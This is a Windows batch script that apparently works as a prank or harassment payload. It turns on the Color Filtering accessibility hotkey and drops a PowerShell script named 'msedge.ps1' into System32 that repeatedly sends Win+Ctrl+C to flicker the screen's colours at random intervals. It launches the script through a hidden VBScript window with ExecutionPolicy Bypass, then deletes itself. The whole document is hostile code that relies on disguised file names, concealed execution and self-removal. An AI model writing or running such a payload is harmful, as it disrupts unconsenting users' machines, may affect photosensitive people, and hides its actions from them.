@echo off
reg add "HKCU\Software\Microsoft\ColorFiltering" /v Active /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "HotkeyEnabled" /t REG_DWORD /d 1 /f
set PS1File=C:\Windows\System32\msedge.ps1
echo $total = Get-Random -Minimum 6 -Maximum 10 >> %PS1File%
echo Add-Type -TypeDefinition ' >> %PS1File%
echo using System; >> %PS1File%
echo using System.Runtime.InteropServices; >> %PS1File%
echo public class Keyboard { >> %PS1File%
echo     [DllImport("user32.dll")] >> %PS1File%
echo     public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo); >> %PS1File%
echo }' >> %PS1File%
echo function Invoke-Toggle { >> %PS1File%
echo     [Keyboard]::keybd_event(0x5B, 0, 0, 0) >> %PS1File%
echo     [Keyboard]::keybd_event(0x11, 0, 0, 0) >> %PS1File%
echo     [Keyboard]::keybd_event(0x43, 0, 0, 0) >> %PS1File%
echo     [Keyboard]::keybd_event(0x43, 0, 2, 0) >> %PS1File%
echo     [Keyboard]::keybd_event(0x11, 0, 2, 0) >> %PS1File%
echo     [Keyboard]::keybd_event(0x5B, 0, 2, 0) >> %PS1File%
echo } >> %PS1File%
echo Invoke-Toggle >> %PS1File%
echo Start-Sleep -Seconds (Get-Random -Minimum 45 -Maximum 90) >> %PS1File%
echo for ($i = 1; $i -lt $total; $i++) { >> %PS1File%
echo     Invoke-Toggle >> %PS1File%
echo     Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300) >> %PS1File%
echo } >> %PS1File%
echo powershell -ExecutionPolicy Bypass C:\Windows\System32\msedge.ps1 >>C:\Windows\System32\setuid.bat
echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Deso.vbs
echo WshShell.Run "C:\Windows\System32\setuid.bat", 0 , false >>C:\Windows\System32\Deso.vbs
start C:\Windows\System32\Deso.vbs
del /f /q "%~f0"
